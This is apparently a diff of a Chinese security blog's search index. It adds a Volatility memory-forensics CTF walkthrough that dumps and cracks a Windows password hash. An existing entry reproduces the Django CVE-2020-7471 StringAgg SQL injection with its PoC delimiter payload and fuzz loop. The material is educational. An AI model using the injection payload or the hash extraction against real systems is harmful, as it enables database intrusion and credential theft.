@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Volatility-Windows内存分析]]></title>
+    <url>%2FVolatility-WindowsMemoryForensicsAnalysis%2F</url>
+    <content type="text"><![CDATA[简介 安装与基础命令 一个例题 一.简介Volatility是一个用于事件响应和恶意软件分析的开源内存取证框架。它是用Python编写的，支持Microsoft Windows，macOS和Linux，volatility框架是一个完全开放的工具集合，在GNU通用许可证下用Python实现，用于从易失性存储器（RAM）样本总提取数字镜像。提取技术完全独立于被取证的系统而执行，但可以查看到系统运行时的状态信息。该框架旨在向人们介绍从内存样本中提取的数字镜像相关的技术，并为进一步研究该领域提供一个平台，它可以分析 .raw、.vmem、.img后缀的文件。 二.安装与基础命令1.安装1git clone https://github.com/volatilityfoundation/volatility.git Volatility使用python2运行，需要的python模块如下 Distorm3:反编译库 Yara:恶意软件分类工具 PyCrypto:加密工具集 PIL:图片处理库 OpenPyxl:读写excel文件 ujson:JSON解析 2.基础命令1python vol.py -f [image] ‐-profile=[profile][plugin] 其中 -f 后面加的是要取证的文件， --profile 后加的是工具识别出的系统版本， [plugin] 是指使用的插件，其中默认存在一些插件，另外还可以自己下载一些插件扩充。 可以使用 -h 参数获取使用方法和插件介绍，这里只列举几个常用到的 imageinfo：显示目标镜像的摘要信息，这常常是第一步，获取内存的操作系统类型及版本，之后可以在 –profile 中带上对应的操作系统，后续操作都要带上这一参数 pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以 notepad：查看当前展示的 notepad 文本 editbox：显示有关编辑控件的信息 screenshot：保存基于GDI窗口的伪截屏 psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程 pstree：以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程 mendump：提取出指定进程，常用foremost 来分离里面的文件(历年美亚杯有此题) filescan：扫描所有的文件列表 hashdump：查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(实际中没有mimikatz效果好) svcscan：扫描 Windows 的服务 connscan：查看网络连接 cmdscan：可用于查看终端记录 dlllist: 列出某一进程加载的所有dll文件 dumpfiles：导出某一文件(指定虚拟地址) hivelist: 列出所有的注册表项及其虚拟地址和物理地址 timeliner: 将所有操作系统事件以时间线的方式展开 三.一个例题内存取证三项 描述：一天下午小白出去吃饭，临走之前还不忘锁了电脑，这时同寝室的小黑想搞点事情，懂点黑客和社工知识的小黑经过多次尝试获得了密码成功进入电脑，于是便悄悄在电脑上动起手脚了，便在桌面上写着什么，想给小白一个惊喜，同时还传送着小白的机密文件，正巧这时小白刚好回来，两人都吓了一跳，小黑也不管自己在电脑上留下的操作急忙离开电脑，故作淡定的说：“我就是随便看看”。 1.小黑写的啥，据说是flag？ 2.那么问题来了，小白的密码是啥？ 3.小黑发送的机密文件里面到底是什么？ 查看镜像信息python27 vol.py -f ..\内存取证三项\1.raw imageinfo 可以看到系统是WinXPSP2x86，使用--profile命令指定系统版本 查看进程 1python27 vol.py -f ..\内存取证三项\1.raw --profile=WinXPSP2x86 pslist 可以看到系统进程中有一个notepad.exe，根据题目，猜测里面包含第一个flag 1python27 vol.py -f ..\内存取证三项\1.raw --profile=WinXPSP2x86 notepad 获取到密文666C61677B57336C6563306D655F376F5F466F72336E356963737D 试了几次，用的base16编码，第一个flag 第二个flag，去查找电脑的密码 1python27 vol.py -f ..\内存取证三项\1.raw --profile=WinXPSP2x86 hashdump Administrator:500:1e27e87bd14ec8af43714428b303e3e4:1e581aafa474dfadfdf83fc31e4fd4ea::: 密文可以使用ophcrack或者其他软件爆破，这里彩虹表比较少，没有完全爆破出来，后面有提示能猜出来是19950101 查看网络连接状况 1python27 vol.py -f ..\内存取证三项\1.raw --profile=WinXPSP2x86 connscan 发现一个2333端口的访问请求，看一下pid对应的进程 此外还有cmd.exe，猜测是使用cmd命令连接nc，可以通过cmd命令行来查看执行了什么命令 1python27 vol.py -f ..\内存取证三项\1.raw --profile=WinXPSP2x86 cmdscan 可以看到获取了一个 P@ssW0rd_is_y0ur_bir7hd4y.zip的压缩文件，将文件导出 1python27 vol.py -f ..\内存取证三项\1.raw --profile=WinXPSP2x86 memdump -p 120 --dump-dir=dump 使用binwalk对提取出来的dmp文件进行分析，发现存在P@ssW0rd_is_y0ur_bir7hd4y.txt，现在只需要提取出这个txt文件，使用foremost提取出文件，得到6个zip 解压生成的压缩包，发现需要密码，密码根据提示可以猜出是19950101，解压获得flag 参考 [内网攻防]电子取证(Forensics)-Windows取证基础 Volatility取证使用笔记 volatility]]></content>
+      <categories>
+        <category>应急响应</category>
+      </categories>
+      <tags>
+        <tag>Volatility</tag>
+        <tag>应急响应</tag>
+        <tag>内存取证</tag>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[CVE-2020-7471漏洞复现及简单分析]]></title>
     <url>%2FCVE-2020-7471%2F</url>
     <content type="text"><![CDATA[复现过程 漏洞分析 CVE-2020-7471 Potential SQL injection via StringAgg(delimiter)这个漏洞出现有一个月了，当时就做了复现，但是由于知识水平有限并没有做太多的分析，最近想起来了，就结合大佬的文章重新学习了这个漏洞。 0x01 复现过程1.测试环境 python 3.7.6 django 3.0.2 postgres 10.12-1 2. 安装 django1pip install django==3.0.2 -i https://pypi.tuna.tsinghua.edu.cn/simple 3. 安装 postgres在Windows中安装postgres 4. 创建数据库使用 SQL shell 登录到 postgres ，创建数据库 1CREATE DATABASE test; 5. 修改配置修改 sqlvul_projects/settings.py 里面的数据库配置 123456789DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.postgresql', 'NAME': 'test', # 数据库名称 'USER': 'postgres', 'PASSWORD': 'postgres', # 数据库用户密码 'HOST': '127.0.0.1', # 数据库地址 'PORT': '5432', &#125; 6. 初始化数据表123python3 manage.py migratepython3 manage.py makemigrations vul_apppython3 manage.py migrate vul_app 7. 执行poc 执行后，可以看到数据库中出现了如下数据 0x02 漏洞分析在 django 中，如果要使用查询操作，正确的写法如下 123sql = "SELECT * FROM user_contacts WHERE username = %s"user = 'test'cursor.execute(sql, [user]) django 会根据你所使用的数据库服务器自动转义特殊的SQL参数。如果你的查询代码像下面这种写法就存在注入的风险 12sql = "SELECT * FROM user_contacts WHERE username = %s" % 'zhugedali'cursor.execute(sql) 回到漏洞本身，在 commit 中可以看到官方对漏洞的修复 https://github.com/django/django/commit/eb31d845323618d688ad429479c6dda973056136 漏洞函数位于如下模块中 1from django.contrib.postgres.aggregates import StringAgg 官方对 delimiter 使用如下语句处理来防御 django 1delimiter_expr = Value(str(delimiter)) 从源码中，可以看到 Value() 函数的内容 123456789101112class Value(Expression): """Represent a wrapped value as a node within an expression.""" def __init__(self, value, output_field=None): """ Arguments: * value: the value this expression represents. The value will be added into the sql parameter list and properly quoted. * output_field: an instance of the model field type that this expression will return, such as IntegerField() or CharField(). """ super().__init__(output_field=output_field) self.value = value https://github.com/django/django/blob/aee0bebc2faf9c6de8211b05d5f1281dc016084f/django/db/models/expressions.py 注释写的非常清楚，Value()处理过的参数会被加到sql的参数列表里，之后会被 django 内置的过滤机制过滤，从而防范 SQL 漏洞。 在存在风险的版本中，poc是如何运作的呢。可以看到，在poc中使用了如下语句 12results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter="-"))results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter="-\') AS "mydefinedname" FROM "vul_app_info" GROUP BY "vul_app_info"."gender" LIMIT 1 OFFSET 1 -- ")) 该语句使用了 StringAgg 类，用于将输入的值使用 delimiter 分隔符级联起来，原本的语句中，查询 Info 对应的 postgres 数据表的 gender 列，并使用 - 来连接 name 列，那么通过修改 delimiter 的内容，就可以实现注入。 在poc作者的文章中，还写出了fuzz部分的代码 1234for c in "!@#$%^&amp;*()_+=-|\\\"':;?/&gt;.&lt;,&#123;&#125;[]": results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name',delimiter=c)) for e in results: pass 当 delimiter 是单引号的时候会导致报错，命令在postgres中变成了 1SELECT "vul_app_info"."gender", STRING_AGG("vul_app_info"."name", ''') AS "mydefinedname" FROM "vul_app_info" GROUP BY "vul_app_info"."gender" LIMIT 1 OFFSET 1 在三个单引号那里出现错误，而我们将 delimiter 设置为 &#39;)-- 便可以成功的注释掉 FROM 语句，从而构造自己的payload。 1&apos;-\&apos;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &apos; 参考 POC地址 CVE-2020-7471 漏洞详细分析原理以及POC CVE-2020-7471 Django SQL注入漏洞复现]]></content>
@@ -88,9 +102,9 @@
       </categories>
       <tags>
         <tag>Metasploit</tag>
+        <tag>kali Linux</tag>
         <tag>攻击测试</tag>
         <tag>木马攻击</tag>
-        <tag>kali Linux</tag>
         <tag>UAC提权</tag>
       </tags>
   </entry>
@@ -206,8 +220,8 @@
       </categories>
       <tags>
         <tag>Metasploit</tag>
-        <tag>攻击测试</tag>
         <tag>kali Linux</tag>
+        <tag>攻击测试</tag>
         <tag>Ettercap</tag>
         <tag>browser_autopwn2</tag>
       </tags>
@@ -259,10 +273,10 @@
         <category>工具使用</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>Social-Engineer-Toolkit</tag>
         <tag>钓鱼网站</tag>
         <tag>社工</tag>
+        <tag>kali Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -286,9 +300,9 @@
         <category>环境搭建</category>
       </categories>
       <tags>
+        <tag>kali Linux</tag>
         <tag>环境搭建</tag>
         <tag>Shellinabox</tag>
-        <tag>kali Linux</tag>
         <tag>Ngrok</tag>
       </tags>
   </entry>
@@ -300,8 +314,8 @@
         <category>攻击测试</category>
       </categories>
       <tags>
-        <tag>攻击测试</tag>
         <tag>kali Linux</tag>
+        <tag>攻击测试</tag>
         <tag>Ettercap</tag>
         <tag>中间人攻击</tag>
         <tag>DNS欺骗</tag>
